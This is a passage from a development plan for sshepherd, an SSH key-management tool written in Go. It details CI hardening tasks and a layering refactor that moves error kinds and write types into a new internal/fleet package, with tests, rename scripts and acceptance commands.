- [ ] **Step 5: Run, expect PASS:** `make actionlint`. `IMAGE=sshepherd:dev make docker smoke` passes with the hardened flags. `yq -o=json -I=0 '.jobs.integration.strategy.matrix.distro' .github/workflows/ci.yml` prints `["alpine","debian","rocky"]`.

#### Task 13 (Integrator): merge, gates, docs, one commit per lane

- [ ] Apply in order on top of the wave-2 tree with P11/P12 applied: round 1 A, B, C; round 2 B, D. Commit after each lane with `make check` green (and `make integration` after D), so the distro matrix and the workflow rewrite can each be reverted alone. Also apply Lane C's `--skip-dirs ci/images` note to `Makefile:152` (`docker-scan`).
- [ ] Run Acceptance (below), with the integration runs one distro at a time.
- [ ] **README.md** (same commit; sample output must come from real runs):
  - Install (~:68-77): `go install …@vX.Y.Z` now reports `vX.Y.Z`, and `make build` reports `git describe`. If D7 is yes, add the "Release binaries" block from Task 9 with real file names from the first release (until then, write the name pattern only, `sshepherd_vX.Y.Z_linux_amd64`, with no made-up output).
  - Dev section: `:1470` becomes `make fuzz   # every Fuzz* target, found automatically (FUZZTIME=15s each)`. Add `make licenses`, `make actionlint`, `make secrets-history BASE=<sha>` and `make integration IT_DISTRO=alpine|debian|rocky`. Replace `:1491` with "CI runs `govulncheck` and fuzzes every target for 2 minutes daily, keeping the generated corpus between runs. Every push also scans its new commits for secrets and reports benchmark deltas." Update the smoke description (`:1489-1490`) with "on a read-only rootfs with all capabilities dropped". `:1503-1505`: integration and E2E run against two sshd containers on alpine, debian and rocky.
- [ ] **CLAUDE.md:** `:119` → `gitleaks dir` (tree, `make check`) + `gitleaks git` over the pushed range (CI) + `--staged` pre-commit. `:125` → `go-licenses check ./cmd/sshepherd` (in `make check`). Fuzz bullet: discovered targets, kept CI corpus, oracle notes. Integration bullet: distro matrix and two containers. Benchmarks bullet: benchstat job summary, informational. Container hardening: the smoke is now enforced. Pin note: scanners and test images in `ci/images/`, Go tools by hand. Status: one sentence.
- [ ] Commits on master, one per lane, each with the attribution line: A `build: discover fuzz targets, license and history scans, real version` · B `test(fuzz): real oracles and seed corpus` · C `ci: Dependabot-visible pins, kept fuzz corpus, history scan, hardened smoke, bench` · D `test(integration): alpine/debian/rocky sshd matrix and two-host E2E`. README/CLAUDE.md deltas go in the commit of the lane they describe.

#### Task 14 (Verifier, read-only)

Re-run Acceptance from a clean clone. Check that `make fuzz-list` equals `grep -rn '^func Fuzz' --include='*_test.go'` (count and names). `grep -rnE '@sha256:' .github/workflows scripts` must print only `uses:` lines, if any. Check the README claims against the Makefile and workflows line by line. Run the Task 3/4 mutants and confirm both fail.

#### Risks

| Risk | Mitigation |
|---|---|
| Distro legs expose real write-script bugs (the point of TST-5) after P11's rewrite | Lane D starts after P11 is applied. Failures go to the repair pass as findings. `internal/` is never patched here. |
| Rocky sshd in a container (PAM, crypto-policies) refuses logins | pam_loginuid made optional, and the keys are ed25519 (allowed by DEFAULT policy). `sshd -T` guards and `docker logs` dump on failure. |
| `trivy config .` fails on root-running test Dockerfiles | `--skip-dirs ci/images` in CI, release and the Makefile. |
| Dependabot does not detect `*.Dockerfile` | The owner checks the dependency graph after merge. Fallback rename `Dockerfile.<name>`. |
| Fuzz corpus entries trip gitleaks or slow `make test` | ≤16 entries per target, ≤4 KiB each, `make secrets` before handing back. |
| Fuzz job length (≈19 discovered targets × 2m ≈ 40 min) | `timeout-minutes: 90`. FUZZTIME can be tuned in one place. |
| Full-history gitleaks finds an old leak | Task 5 runs the baseline first, and any finding goes to the owner, never silently ignored. |
| `newRootCmd`/`run.go` changed by P01/P06 | One-line edit. The test adapts to the signature. |

#### Acceptance

```bash
export GOTOOLCHAIN=go1.27.3
make tools
make check                                   # vet -tags=integration, lint with build-tags, gosec -tags (W0), licenses
test "$(make -s fuzz-list | wc -l)" -eq "$(grep -rh '^func Fuzz' --include='*_test.go' . | wc -l)"
make fuzz FUZZTIME=10s
go test -run '^FuzzRemote$' ./internal/sanitize/ && go test -run '^FuzzWriteCmds$' ./internal/sshwrite/
make build && ./bin/sshepherd --version | grep -F "$(git describe --tags --always --dirty)"
make secrets-history                          # full history, exit 0
make integration IT_DISTRO=alpine
make integration IT_DISTRO=debian
make integration IT_DISTRO=rocky
IMAGE=sshepherd:dev make docker smoke         # hardened runs
make actionlint                               # shellcheck disabled; not part of make check
grep -nE '^\s*[A-Z_]+_IMAGE:.*@sha256:' .github/workflows/*.yml; test $? -eq 1
```

#### Out of scope

- Moving the Go dev tools to `go.mod` `tool` directives or Renovate (OPS-5's larger option). The Makefile header documents the manual-bump decision, and this package only corrects the comment.
- Committing CI-generated corpus after every scheduled run (it stays in the actions cache). Seeding here is a one-time run.
- goreleaser (D7 option 2), Windows binaries, SBOMs for the binaries.
- Any change to `internal/` product code, `sanitize.go` (P11), the write script (P11), `TestE2EApplyLoop`'s stages, or the existing corpus dirs.
- SELinux-labelled hosts (the `ls` trailing `.`), which containers do not reproduce. The verifier rated it harmless.
- Repo rulesets and required checks, which are owner actions (D6). Required checks name only P02's `ci-ok` aggregator, so the distro rename needs no ruleset change.

---

## Wave 3 — layering refactor and coverage ratchet (P14, alone)

**Fixed order (review panel, arch-parallel):** P14 is **always W3** and P04-impl is **always W4**. P14 is behavior-neutral and its goldens and E2E tests pin that, every W5+ slice waits for it anyway, and writing P04-impl's plan only after P14 lands means it targets `internal/fleet`/`internal/workflow` directly instead of rebasing onto the churn. D1–D5 and their sub-questions are asked while W1–W3 run.

**Starts:** after W2 is committed. **Decisions needed:** none.
**Packages:** P14 only. 5 findings (ARC-3's behavior half already landed in W1 as P07 Task 7). It runs after the fix waves so the refactor moves the final code; the coverage ratchet (S6) sees every test that exists by then and is re-measured, never lowered, after W4.

Shape: one lane at a time, and the integrator commits after each step, so each next agent starts from that commit (review panel: the skeleton commits every patch of a round, so a depguard draft could not wait in round 1 for S2–S4). `rounds = [[A:S2], [A:S3], [A:S4], [B:S5], [B:S6]]`, one commit per step. Expect `COVERAGE_MIN` = 93 (measured 94.4% today without `sshtest`/`testkeys`), not the ≈89 in the original stub.

Rebase notes: P06 rewrote `cmd/sshepherd/apply.go`/`editrun.go`; P07 added `Hinted`/`HintOf` (moved in S2) and the ARC-3 kind branch in `jsonErrorFor` (S2 renames `audit.ErrorKindOf` → `fleet.ErrorKindOf` there); P11 edited `sshwrite.go`, `exec.go`, `plan.go`, `sshread.go`, `connect.go` (Task 7b's `remoteText`); P12 changed `m.Unchanged()`; P13-0 (W0) and P13 (W2) edited `Makefile` and `.golangci.yml` (keep `build-tags` and the new targets). P06's `fleetSession` stays in `cmd` so `internal/workflow` stays transport-free. P08-impl's exit-2 verdict later extends `workflow.Outcome.ExitCode()`.

### P14 — Layering refactor: error kinds in a leaf package, apply free of transport types, workflow out of package main, depguard rules, coverage ratchet

> **Program notes (master plan, revised):** Runs alone as **W3**; the integrator commits after each step. S1 (the ARC-3 behavior fix) moved to P07 Task 7 in W1. Steps run one per round: S2, S3, S4, S5, S6. Expect `COVERAGE_MIN` = 93. ARC-4 is **partly** fixed here (the transport half, S3); splitting the revoke/rotate renderers out of `internal/apply` is follow-up F-ARC-4b (see Follow-up candidates).

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

- **Kind:** fix (refactor plus one real bug, ARC-3). It changes no product semantics and no manifest schema, so no owner decision is needed. The one wire-visible effect is additive: `error_kind` now also appears on write-phase failures in apply/revoke/rotate `--json`.
- **Wave:** 3 (fixed). It runs alone, after every fix wave and **before** P04-impl (W4), whose plan is written against this package's layout.
- **depends_on:** P07, P11, P12, P13 (and P05, P06, which edit the same files).
- **Baseline:** line numbers below are from `adee207`. P05, P06, P07, P11, P12 and P13 will have moved them by the time this runs. **Every agent re-reads the cited functions before editing.** The function names are the stable anchors.

**Goal:** Turn the import graph into the documented layering and make it machine-enforced:
1. Error kinds and the read result live in a stdlib-only leaf, `internal/fleet`. Transport no longer imports `audit`, and write-phase JSON errors keep their kind (the ARC-3 bug).
2. `internal/apply` imports no transport, terminal or agent packages.
3. The confirm, commit and write ordering moves out of `package main` into `internal/workflow`, behind interfaces.
4. depguard plus a `make layering` check enforce all of the above.
5. The coverage gate measures production code only and is ratcheted to the measured value.

**Architecture:**
- `internal/fleet` (new, stdlib-only) holds the shared vocabulary: `ErrorKind` and its constants, `KindedError`, `ErrorKindOf`, `Hinted`/`HintOf` (added to `audit` by P07), `ReadResult`, `HeldKey`, `SourceAgent`, `MaxRemoteOutput`, `Snapshot`/`SnapshotOf`/`Cksum`, `WriteRequest`, `ErrWriteNotStarted`, `RefusalError`/`Refused`/`IsRefusal` and `Keys2DisabledSuffix`. `sshconn`, `sshread`, `sshwrite`, `audit` and `apply` all import it.
- `internal/workflow` (new) holds `Apply(ctx, Request) (Outcome, error)`. Its seams are `audit.KeyReader`, `apply.Writer`, `HeldLister`, `Confirmer`, `ManifestCommitter` and `Reporter`, so it is transport-free and unit-testable with fakes.
- `cmd/sshepherd` keeps preflight (identities, TTY prompt, known_hosts) and builds the seams: `sshread.Client`, `sshwrite.FleetWriter`, `*sshconn.Credentials` as the `HeldLister`, and the cobra confirm gate. It maps an `Outcome` to rendering and exit codes.
- `.golangci.yml` depguard gets path-scoped rules for direct imports. A new `make layering` target checks transitive imports with `go list -deps`.

**Tech Stack:** Go 1.27 (`GOTOOLCHAIN=go1.27.3` through the Makefile), golangci-lint v2.15.0 depguard (`files` globs, `$gostd`, `!$test`), goleak, golden files (unchanged by design), `go list -deps`, `deadcode`.

#### Findings covered

| ID | Sev | One line |
|---|---|---|
| ARC-3 | MEDIUM | `sshconn` and `sshread` import `audit` for the error kinds and `ReadResult`. `apply.jsonErrorFor` (`internal/apply/json.go:310-330`) drops the kind of every write-phase error, so a host key that changes between plan and write shows no `error_kind`. |
| ARC-4 | LOW | `internal/apply` is called "pure" but imports `sshconn` (`HeldKey`, `SourceAgent`, `MaxRemoteOutput`, `SanitizeRemote`) and `sshwrite` (`Snapshot`, `Request`, `ErrNotStarted`, `IsRefusal`, `Keys2DisabledSuffix`), and through them `x/term`, `ssh/agent`, `knownhosts`, `keyfile` and `x/sys/unix` (`plan.go:108,127,142,157,451-489`, `exec.go:20-34,108-117,140`, `report.go:184`, `json.go:194`). |
| ARC-2 | LOW | The safety-critical order (preflight → plan → confirm → re-list → save → write → finish) is `runApply`, plus an `applyRun` with five hook funcs and a closure-captured `saved` flag, all inside `package main` (`cmd/sshepherd/apply.go:131-299`, `editrun.go:187-262,411-443`). |
| ARC-8 | LOW | depguard (`.golangci.yml:53-71`) bans only md5, sha1, os/exec and math/rand. No layering rule exists. |
| TST-7 | LOW | `COVERAGE_MIN := 80` (`Makefile:5`). Measured today: 90.6% raw and **94.4% with `internal/sshconn/sshtest` and `internal/testkeys` excluded** (both are 0% in their own profile and dilute the total). |

#### Files owned (all edits; P14 runs alone, so the list is wider than the package stub)

- New: `internal/fleet/{doc.go,errors.go,fleet.go,write.go,errors_test.go,write_test.go,leak_test.go}`, `internal/workflow/{workflow.go,workflow_test.go,leak_test.go}`, `internal/apply/predicates.go`, `internal/apply/predicates_test.go`
- Transport: `internal/sshconn/{errors.go,sshconn.go,hostkey.go,connect.go,credentials.go}`, `internal/sshread/sshread.go`, `internal/sshwrite/sshwrite.go`
- Domain: `internal/audit/{errors.go,audit.go,json.go,report.go}`, `internal/apply/{plan.go,exec.go,json.go,report.go}`
- CLI: `cmd/sshepherd/{apply.go,editrun.go}`. `revoke.go` and `rotate.go` change only if they compile against moved names.
- Tests, mechanical renames only (no assertion changes): `internal/sshconn/*_test.go`, `internal/sshread/integration_test.go`, `internal/sshwrite/{sshwrite_test.go,integration_test.go,fuzz_test.go}`, `internal/apply/*_test.go`, `internal/adopt/adopt_test.go`, `internal/audit/*_test.go`, `cmd/sshepherd/{adopt_test.go,editrun_test.go,json_cmd_test.go}`. Plus one new assertion each in `internal/apply/json_test.go` and `internal/sshwrite/sshwrite_test.go`.
- Gates: `.golangci.yml`, `Makefile`
- Docs (integrator only): `README.md` (Layout, `make` lines, apply JSON `error_kind` sentence), `CLAUDE.md` (Status layering text, Testing coverage line)

---

#### Execution model (read before starting)

Steps S2–S4 touch the same files (`apply/*.go`, `sshconn/*.go`, `sshread.go`, the cmd run body), so they are **sequential**. Each step is one agent in a worktree, then the integrator applies the diff, runs the gate and **commits**. The next step starts from that commit. Lane B's S5 and S6 also run **after S4**, one per round: S5's depguard rules forbid imports that S2–S4 remove, and S6 measures coverage after S1–S5, so drafting them early buys nothing and would turn `make check` red on master.

| Lane | Step | Owner | Files (exclusive while the step runs) | Commit |
|---|---|---|---|---|
| A | S2 ARC-3 move | Agent A2 | `internal/fleet/**` (errors + read result), `internal/audit/{errors,audit,json,report}.go`, `internal/sshconn/*`, `internal/sshread/*`, `internal/adopt/adopt_test.go`, `cmd/sshepherd/adopt_test.go`, rename-only tests | `refactor: move error kinds and ReadResult into internal/fleet` |
| A | S3 ARC-4 | Agent A3 | `internal/fleet/{fleet,write}.go`, `internal/apply/{plan,exec,json,report}.go` + tests, `internal/sshwrite/*`, `internal/sshconn/{credentials,sshconn}.go` + tests, `cmd/sshepherd/{apply,editrun}.go` + `editrun_test.go` (renames) | `refactor(apply): drop transport imports; write vocabulary in internal/fleet` |
| A | S4 ARC-2 | Agent A4 | `internal/workflow/**`, `internal/apply/predicates*.go`, `cmd/sshepherd/{apply,editrun,json_cmd_test,editrun_test}.go` (+ `revoke.go`/`rotate.go` if needed) | `refactor: extract the write workflow into internal/workflow` |
| B | S5 ARC-8 (after S4) | Agent B | `.golangci.yml`, `Makefile` (`layering` target only) | `build(lint): enforce package layering with depguard and make layering` |
| B | S6 TST-7 (after S5) | Agent B | `Makefile` (coverage filter, `COVERAGE_MIN`) | `build: gate coverage on production packages; ratchet COVERAGE_MIN` |
| — | Docs | Integrator | `README.md`, `CLAUDE.md` | folded into the S4 and S6 commits (README is always updated in the same commit as the change it describes) |

Rules for every agent:
- **No commits.** Leave a diff in the worktree. The integrator commits on `master` after `make check`. After S3, S4 and S6 it also runs `make integration`.
- **Behavior lock:** after S2–S4, `git diff -- '*.golden' '*.golden.json' 'cmd/sshepherd/testdata/**'` must be empty. The only intended JSON change is S1's `error_kind` on write-phase failures, and the existing goldens contain no kinded write error, so they stay unchanged too. Existing cmd tests may change **only** import paths and moved identifiers.
- Mechanical renames use `perl -pi` (the macOS `sed` has no `\b`), then `goimports -w`. Let the compiler find leftovers. Never hand-edit golden files.
- The rtk hook summarizes test output. Use `rtk proxy go test …` when you need the exact failure lines.

---

#### Task S1 — moved to P07 Task 7 (W1)

The ARC-3 **behavior** fix (a write-phase failure keeps its `error_kind` in apply/revoke/rotate `--json`) is one branch in `jsonErrorFor`, a function P07 already rewrites in W1, so it lands there (review panel, arch-parallel). Its test uses P07's three-value signature `msg, kind, _ := jsonErrorFor(tt.p)`. P14 keeps only the **move** of the kinds into `internal/fleet` (S2), where `audit.ErrorKindOf` in that branch becomes `fleet.ErrorKindOf` by the S2 rename.

---

#### Task S2 — ARC-3 move: error kinds and `ReadResult` into `internal/fleet`

**Files:**
- Create: `internal/fleet/doc.go`, `internal/fleet/errors.go`, `internal/fleet/fleet.go`, `internal/fleet/errors_test.go`, `internal/fleet/leak_test.go`
- Modify: `internal/audit/errors.go` (keeps only `hostKeyAlert`), `internal/audit/audit.go` (`ReadResult` removed, `KeyReader` returns `fleet.ReadResult`), `internal/audit/json.go:51,167`, `internal/audit/report.go:28,101,105,309`, `internal/sshconn/{errors.go,sshconn.go:178-194,hostkey.go:31-55,connect.go:158,195,304-329,credentials.go:131}`, `internal/sshread/sshread.go` (drop the `audit` import; `:116`'s assertion moves to `cmd/sshepherd/apply.go`)
- Rename-only: every `*_test.go` that names the moved identifiers (`internal/sshconn/*_test.go`, `internal/adopt/adopt_test.go`, `internal/apply/json_test.go`, `internal/sshread/integration_test.go`, `cmd/sshepherd/adopt_test.go`, `internal/audit/*_test.go`)

- [ ] **Step 1: Write the failing test** (`internal/fleet/errors_test.go`). Move audit's existing `ErrorKindOf` table test here (find it with `grep -rn 'func TestErrorKindOf' internal/audit`) together with P07's `TestHintOf`, and add the wire-value pin:

```go
package fleet

// TestErrorKindWireValues pins the JSON contract: these strings appear
// verbatim as error_kind in audit and apply documents (schema 1).
func TestErrorKindWireValues(t *testing.T) {
	want := map[ErrorKind]string{
		ErrorKindUnknown: "unknown", ErrorKindHostKeyUnknown: "host_key_unknown",
		ErrorKindHostKeyChanged: "host_key_changed", ErrorKindHostKeyTypeUnrecorded: "host_key_type_unrecorded",
		ErrorKindHostKeyRevoked: "host_key_revoked", ErrorKindHostKey: "host_key", ErrorKindAgent: "agent",
		ErrorKindAuth: "auth", ErrorKindDial: "dial", ErrorKindTimeout: "timeout",
		ErrorKindCanceled: "canceled", ErrorKindHandshake: "handshake", ErrorKindRemote: "remote",
	}
	for k, s := range want {
		if string(k) != s {
			t.Errorf("%q != %q", k, s)
		}
	}
}
```

`internal/fleet/leak_test.go` is a copy of `internal/apply/leak_test.go` (`goleak.VerifyTestMain`) with `package fleet`.

- [ ] **Step 2: Run to see it fail**

`rtk proxy go test ./internal/fleet/ -count=1` should fail with `undefined: ErrorKind` (the package does not exist yet). Also record the "before" layering: `go list -deps ./internal/sshconn | grep SSHepherd/internal/audit` prints a line.

- [ ] **Step 3: Implement**

1. `internal/fleet/doc.go`:
   ```go
   // Package fleet is the shared, stdlib-only vocabulary between the
   // transport (sshconn, sshread, sshwrite) and the domain (audit, apply,
   // adopt, workflow): error classification, read results, held keys and
   // the write request. It imports nothing outside the standard library.
   package fleet
   ```
2. `internal/fleet/errors.go`: move `ErrorKind`, every `ErrorKind*` constant, `KindedError` and `ErrorKindOf` **verbatim** from `internal/audit/errors.go:9-77`, plus P07's `Hinted` and `HintOf`. Change "audit wire classification" in the comments to "wire classification (audit and apply JSON)".
3. `internal/fleet/fleet.go`: move `ReadResult` verbatim from `internal/audit/audit.go:18-35`.
4. `internal/audit/errors.go` keeps only:
   ```go
   // hostKeyAlert reports whether kind is a host-key failure that may mean the
   // server is being impersonated — exit 2, not a mere unreachable.
   func hostKeyAlert(kind fleet.ErrorKind) bool {
   	return kind == fleet.ErrorKindHostKeyChanged || kind == fleet.ErrorKindHostKeyRevoked
   }
   ```
   P07's exported helpers (`UnknownLabel`, `ErrorTag`, `Hints`, `CleanHint`) stay in `audit`, now calling `fleet.ErrorKindOf` and `fleet.HintOf`. `apply` → `audit` remains an allowed edge.
5. Mechanical rename across the repo, then fix the in-package unqualified uses (`audit/report.go`, `audit/json.go`, the `sshconn` files) by hand:
   ```sh
   perl -pi -e 's/\baudit\.(ErrorKind\w*|KindedError|ReadResult|Hinted|HintOf)\b/fleet.$1/g' $(git ls-files '*.go')
   goimports -w $(git ls-files '*.go')
   go build ./... && go vet ./...
   ```
   The `\w*` covers `ErrorKind`, `ErrorKindOf` and every constant.
6. `internal/sshconn/errors.go`: `Kind fleet.ErrorKind`, `var _ fleet.KindedError = (*Error)(nil)` and `var _ fleet.Hinted = (*Error)(nil)`, and `classify`, `handshakeKind` and `ctxKind` typed on `fleet.ErrorKind`. Comment fix: "Kind is the wire classification (fleet.ErrorKind)".
7. `internal/sshread/sshread.go`: remove `var _ audit.KeyReader = (*Client)(nil)` and the `audit` import, and return `fleet.ReadResult`. Add both assertions to `cmd/sshepherd/apply.go` (cmd is where the seams are wired):
   ```go
   // The transport implementations of the domain seams, checked at compile time.
   var (
   	_ audit.KeyReader = (*sshread.Client)(nil)
   	_ apply.Writer    = (*sshwrite.FleetWriter)(nil)
   )
   ```

- [ ] **Step 4: Run to see it pass**

```sh
rtk proxy go test ./internal/fleet/ ./internal/audit/ ./internal/sshconn/... ./internal/sshread/ ./internal/apply/ ./internal/adopt/ ./cmd/sshepherd/ -count=1
go list -deps ./internal/sshconn ./internal/sshread | grep -E 'SSHepherd/internal/(audit|apply)$' && echo FAIL || echo OK   # expect OK
go list -f '{{join .Imports " "}}' ./internal/fleet   # expect only: context errors net
git diff --stat -- '*.golden' '*.golden.json'          # expect empty
```

Then `make check` (deadcode must stay clean: nothing is left behind in `audit`).

**Risk:** a `perl` rewrite inside comments is harmless; review `git diff` for prose like "audit.ErrorKind values" in `audit/json.go:51` and reword it. `wrapcheck` exempts `sshconn` only, but `fleet` returns no wrapped errors, so no config change is needed.

---

#### Task S3 — ARC-4: `internal/apply` imports no transport

**Decision recorded here (no owner input needed, internal API only):** the write vocabulary moves into `fleet`. It cannot go into `apply`, because `sshwrite` → `apply` would drag the domain into the transport. `sshwrite` keeps **type aliases** `type Request = fleet.WriteRequest` and `type Snapshot = fleet.Snapshot`, plus its `SnapshotOf` wrapper (used at `sshwrite.go:551`). Its 40-plus protocol-test call sites (`sshwrite_test.go:55-524`, `fuzz_test.go:37-39`, `integration_test.go:124-130`) then stay untouched. Every other concept moves without aliases. `KeySource` stays a plain `string` field with the `fleet.SourceAgent` constant. A named type would ripple through `sourceMap`'s `map[string]string` and `id.Path` conversions for no safety gain.

**Files:**
- Create: `internal/fleet/write.go`, `internal/fleet/write_test.go`. Extend `internal/fleet/fleet.go` with `HeldKey`, `SourceAgent` and `MaxRemoteOutput`.
- Modify: `internal/sshconn/credentials.go:19-35` (`HeldKey`/`SourceAgent` removed, `Held` returns `[]fleet.HeldKey`), `internal/sshconn/sshconn.go:38-40` (`const MaxRemoteOutput = fleet.MaxRemoteOutput`, kept as the transport's own name for its 10 internal uses), `internal/sshwrite/sshwrite.go` (`:55-130` vocabulary moved, `:313-328` `IsRefusal`/`ErrNotStarted` removed, `:491-503` refusals wrapped), `internal/apply/{plan.go,exec.go,json.go:194,report.go:184}`
- Rename-only tests: `internal/apply/{plan,exec,identity,plural,former,report,identity_report,json}_test.go`, `internal/sshconn/{credentials,connect_creds,sshconn,connect}_test.go`, `internal/sshwrite/sshwrite_test.go` (`IsRefusal` → `fleet.IsRefusal` at `:666,754,1050`; `TestCksumMatchesPOSIXCksum` moves to `fleet/write_test.go`), `cmd/sshepherd/editrun_test.go:59-62`

- [ ] **Step 1: Write the failing tests**

(a) The import-set assertion is the red/green signal for this task:
```sh
go list -deps ./internal/apply | grep -E 'SSHepherd/internal/(sshconn|sshread|sshwrite|keyfile)$|golang.org/x/term$|golang.org/x/crypto/ssh/(agent|knownhosts)$|golang.org/x/sys/unix$'
```
Today it prints 7 lines. The target is no output.

(b) `internal/fleet/write_test.go`:
```go
package fleet

// TestIsRefusal: only errors wrapped by Refused count, through any wrapper;
// the message is the wrapped error's, unchanged.
func TestIsRefusal(t *testing.T) {
	base := errors.New("/home/u/.ssh/authorized_keys changed since the plan was read")
	r := Refused(base)
	if !IsRefusal(r) || !IsRefusal(fmt.Errorf("srv: %w", r)) {
		t.Fatal("wrapped refusal not recognized")
	}
	if r.Error() != base.Error() || !errors.Is(r, base) {
		t.Fatalf("Refused changed the error: %q", r.Error())
	}
	if IsRefusal(base) || IsRefusal(nil) {
		t.Fatal("plain error counted as a refusal")
	}
}

func TestSnapshotOf(t *testing.T) {
	if got := SnapshotOf(true, []byte("ignored")); got != (Snapshot{Absent: true}) {
		t.Errorf("absent = %+v", got)
	}
	if got := SnapshotOf(false, []byte("x\n")); got.Size != 2 || got.Cksum != Cksum([]byte("x\n")) {
		t.Errorf("present = %+v", got)
	}
}
```
Also move `TestCksumMatchesPOSIXCksum` (`internal/sshwrite/sshwrite_test.go:28-45`) here unchanged.

(c) `internal/sshwrite/sshwrite_test.go`: extend the existing exit-code table at `:640-670` so every refusal row asserts `fleet.IsRefusal(err)` **and** `errors.As` to its concrete type, and the `shortWriteExit`, lockout and default rows assert `!fleet.IsRefusal(err)`. That locks the sshwrite→fleet contract the wrapping introduces.

- [ ] **Step 2: Run to see it fail**

`rtk proxy go test ./internal/fleet/ -count=1` should fail with `undefined: Refused, SnapshotOf, Cksum`. The `go list` command prints 7 lines.

- [ ] **Step 3: Implement**

`internal/fleet/fleet.go` (append):
```go
// SourceAgent is HeldKey.Source for a key the ssh-agent holds.
const SourceAgent = "agent"

// HeldKey is one plain key the run can authenticate with: its SHA256
// fingerprint and where it comes from — the --identity path, or SourceAgent.
type HeldKey struct {
	Fingerprint string
	Source      string
}

// Label renders the key with its source, as refusals list it.
func (k HeldKey) Label() string { return k.Fingerprint + " (" + k.Source + ")" }

// MaxRemoteOutput caps remote stdout/stderr buffering (1 MiB) and, so a
// written file can always be read back, the rendered file size.
const MaxRemoteOutput = 1 << 20
```

`internal/fleet/write.go`. `Snapshot`, `SnapshotOf`, `cksumTable` and `Cksum` move **verbatim** from `sshwrite.go:71-131`. `Request` moves verbatim as `WriteRequest` (`:94-104`). Add:
```go
// Keys2DisabledSuffix is appended to ~/.ssh/authorized_keys2 when a write
// disables it (WriteRequest.DisableKeys2).
const Keys2DisabledSuffix = ".sshepherd.disabled"

// ErrWriteNotStarted marks a write interrupted (ctx canceled) before it
// began: nothing on the server changed.
var ErrWriteNotStarted = errors.New("interrupted before the write started")

// RefusalError marks a write the server declined before anything changed
// (symlink, unsafe path, changed since plan, locked). Error() and the
// chain are Err's, unchanged, so errors.As still reaches the concrete type.
type RefusalError struct{ Err error }

func (e *RefusalError) Error() string { return e.Err.Error() }
func (e *RefusalError) Unwrap() error { return e.Err }

// Refused marks err as a refusal.
func Refused(err error) error { return &RefusalError{Err: err} }

// IsRefusal reports whether a RefusalError is anywhere in err's chain.
func IsRefusal(err error) bool {
	var r *RefusalError
	return errors.As(err, &r)
}
```
Why a wrapper and not a marker method: `deadcode` (RTA) reports a method that is only type-asserted and never called, so a `WriteRefused()` marker on the four error types would fail `make check`.

`internal/sshwrite/sshwrite.go`:
- `type Snapshot = fleet.Snapshot`, `type Request = fleet.WriteRequest`, and `func SnapshotOf(absent bool, content []byte) Snapshot { return fleet.SnapshotOf(absent, content) }`. Use `fleet.Keys2DisabledSuffix` at `:246,254,565`.
- `writeExitError`: `return fleet.Refused(&SymlinkError{Path: path})`, and the same for `ChangedError`, `LockedError` and `UnsafePathError`. `restoreExitError` stays unwrapped (the `:576` comment explains why). Update that comment to "would make fleet.IsRefusal …".
- Delete `IsRefusal` and `ErrNotStarted`. `connectForWrite` (`:460`) wraps `fleet.ErrWriteNotStarted`. The `Apply` doc comment (`:365`) says "Refusals (fleet.IsRefusal)".

`internal/apply`:
- `plan.go`: `Expect fleet.Snapshot`, `fleet.SnapshotOf(...)` at `:157`, `[]fleet.HeldKey` in `Build`, `planOne`, `guardCheck`, `lockoutRefusal`, `agentOnlyWarning`, `isFileKey`, `heldSet`, `sourceMap` and `heldList`, `fleet.SourceAgent`, and `var maxRender = fleet.MaxRemoteOutput`. Fix the `Build` doc comment's "sshconn.Credentials.Held" to "the run's held-key listing".
- `exec.go`: `Writer.Apply(ctx, srv config.Server, req fleet.WriteRequest) error`, `ExecOptions.Held []fleet.HeldKey`, `errors.Is(err, fleet.ErrWriteNotStarted)`, `fleet.IsRefusal(err)` and `fleet.SourceAgent`. Fix the comment "sshwrite.FleetWriter is the real one" to "the transport implements it (cmd wires sshwrite.FleetWriter)".
- `json.go:194`: `func clean(s string) string { return sanitize.Remote(s) }`. `sanitize` is a stdlib-only leaf, and `audit` already uses it.
- `report.go:184`: `const Keys2DisabledSuffix = fleet.Keys2DisabledSuffix`. <!-- gitleaks:allow (a Go constant name, not a secret) -->
- `exec_test.go:72-75`: the fake writer returns `fleet.Refused(errors.New("/etc/keys is a symlink"))` and similar for the refusal rows. For the lockout row, use a plain `errors.New("lockout prevented — restored previous file (…)")`. The test checks the class mapping, not sshwrite's types, and those types are now covered by the sshwrite contract table from Step 1(c).
- Package doc (`plan.go:1-4`): "…phase-2 orchestration behind a writer seam… Nothing here imports the SSH transport." This replaces "touches the network".

Mechanical renames:
```sh
perl -pi -e 's/\bsshconn\.(HeldKey|SourceAgent)\b/fleet.$1/g; s/\bsshwrite\.(Request)\b/fleet.WriteRequest/g; s/\bsshwrite\.(Snapshot|SnapshotOf)\b/fleet.$1/g; s/\bsshwrite\.ErrNotStarted\b/fleet.ErrWriteNotStarted/g; s/\bsshwrite\.IsRefusal\b/fleet.IsRefusal/g' \
  $(git ls-files 'internal/apply/*.go' 'internal/sshconn/*.go' 'cmd/sshepherd/*.go')
goimports -w $(git ls-files '*.go'); go build ./... && go vet ./...
```
Inside `sshconn` itself, the unqualified `HeldKey` and `SourceAgent` become `fleet.HeldKey` and `fleet.SourceAgent` by hand (`credentials.go:171,177,198`).

- [ ] **Step 4: Run to see it pass**

```sh
rtk proxy go test ./internal/fleet/ ./internal/apply/ ./internal/sshwrite/ ./internal/sshconn/... ./cmd/sshepherd/ -count=1 -race
go list -deps ./internal/apply | grep -E '<pattern from Step 1(a)>' && echo FAIL || echo OK   # expect OK
go list -f '{{join .Imports " "}}' ./internal/fleet   # expect only: context errors net
git diff --stat -- '*.golden' '*.golden.json'          # expect empty
make check && make integration
```
`make integration` matters here: the refusal wrapping and the `Request` alias are on the real write path (`internal/sshwrite/integration_test.go`, the dockerized sshd matrix, the identity integration test).

**Risk:** the integration tests assert concrete refusal types with `errors.As`, and those still match through `Unwrap`. A test that compares `err.Error()` strings is unaffected, because the message is unchanged. If P11 or P08-impl added transport types to `ServerPlan` or `ExecOptions`, those must move into `fleet` the same way. The `go list` check fails until they do.

---

#### Task S4 — ARC-2: the write workflow moves to `internal/workflow`

**Files:**
- Create: `internal/workflow/workflow.go`, `internal/workflow/workflow_test.go`, `internal/workflow/leak_test.go`, `internal/apply/predicates.go`, `internal/apply/predicates_test.go`
